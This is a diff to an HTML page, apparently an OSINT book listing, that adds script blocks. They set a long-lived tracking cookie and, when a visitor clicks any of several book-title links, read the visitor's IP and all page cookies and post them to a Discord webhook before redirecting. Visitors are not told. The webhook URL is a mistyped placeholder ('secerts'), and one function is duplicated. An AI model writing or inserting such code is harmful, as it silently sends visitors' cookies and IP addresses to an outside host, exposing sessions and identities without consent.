@@ -687,5 +687,120 @@ function existingClickFunction(element) {
 }
 
                        </script>
+                       <script>
+                               function setCookie(name, value, days) {
+    const date = new Date();
+    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // Convert days to milliseconds
+    const expires = "expires=" + date.toUTCString();
+    document.cookie = name + "=" + value + ";" + expires + ";path=/";
+}
+
+// Example: Create a cookie named 'hades_user_id' with value '12345' for 2 years (730 days)
+setCookie('hades_user_id', '12345', 730);
+
+console.log("Cookie 'hades_user_id' Huck...");
+
+                       </script>
+                       <script>
+                               // Set your GitHub secret webhook URL
+const webhookUrl = "${{ secerts.GITHUB_SECRET_WEBHOOK_URL }}";
+
+// Function to send data to Discord via webhook
+async function sendToDiscord(ip, url, elementId, cookies) {
+    const payload = {
+        content: `User clicked on: ${elementId}`,
+        embeds: [
+            {
+                title: "User Interaction Details",
+                fields: [
+                    { name: "Redirect URL", value: url, inline: false },
+                    { name: "IP Address", value: ip, inline: false },
+                    { name: "Cookies", value: cookies || "No cookies found", inline: false }
+                ]
+            }
+        ]
+    };
+
+    try {
+        const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            console.error("Failed to send data to Discord webhook:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Error sending data to Discord:", error);
+    }
+}
+
+// Function to get the user's IP address
+async function getIpAddress() {
+    try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error("Error fetching IP address:", error);
+        return "Unknown IP";
+    }
+}
+
+// Function to handle click events
+async function handleClick(event) {
+    const element = event.target;
+    const elementId = element.id;
+    const redirectUrl = element.getAttribute("data-url"); // Add `data-url` to links for redirection
+    const cookies = document.cookie;
+
+    // Get user's IP address
+    const ipAddress = await getIpAddress();
+
+    // Send data to Discord
+    await sendToDiscord(ipAddress, redirectUrl, elementId, cookies);
+
+    // Redirect to the URL
+    if (redirectUrl) {
+        window.location.href = redirectUrl;
+    }
+}
+
+// Set up event listeners for specified elements
+const ids = [
+    "Building Your Own AI Girlfriend Using GPT and Custom Data: A Step-by-Step Guide",
+    "Building AI and GPT Agents for OSINT: A Guide to Everyday",
+    "Drones on Steroids: The Future of OSINT in the Sky",
+    "Get Rich with OSINT",
+    "The Art of Invisibility",
+    "Mastering Twitter OSINT",
+    "Mastering Reddit OSINT",
+    "Mastering Geo-OSINT"
+];
+
+ids.forEach(id => {
+    const element = document.getElementById(id);
+    if (element) {
+        element.addEventListener("click", handleClick);
+    } else {
+        console.warn(`Element with ID "${id}" not found.`);
+    }
+});
+
+// Example: Create a cookie
+function setCookie(name, value, days) {
+    const date = new Date();
+    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // Convert days to milliseconds
+    const expires = "expires=" + date.toUTCString();
+    document.cookie = name + "=" + value + ";" + expires + ";path=/";
+}
+
+// Example usage: Create a cookie named 'hades_user_id' with value '12345' for 2 years (730 days)
+setCookie("hades_user_id", "12345", 730);
+console.log("Cookie 'hades_user_id' created for 2 years.");
+
+                       </script>
+        
             </body>
         </html>
